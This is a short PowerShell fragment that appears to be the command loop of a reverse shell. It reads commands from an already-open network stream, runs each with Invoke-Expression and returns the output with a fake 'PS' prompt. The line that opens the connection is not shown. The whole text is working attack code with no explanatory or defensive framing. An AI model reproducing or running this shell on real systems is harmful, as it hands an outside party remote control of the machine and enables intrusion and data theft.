
$s = $c.GetStream();
[byte[]]$b = 0..65535|%{0};
while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
    $sb= (iex $d 2>&1 | Out-String );
    $sb2 = $sb + "PS " + (pwd).Path + "> ";
    $sbt = ([text.encoding]::ASCII).GetBytes($sb2);
    $s.Write($sbt,0,$sbt.Length);
    $s.Flush()
};
$c.Close()
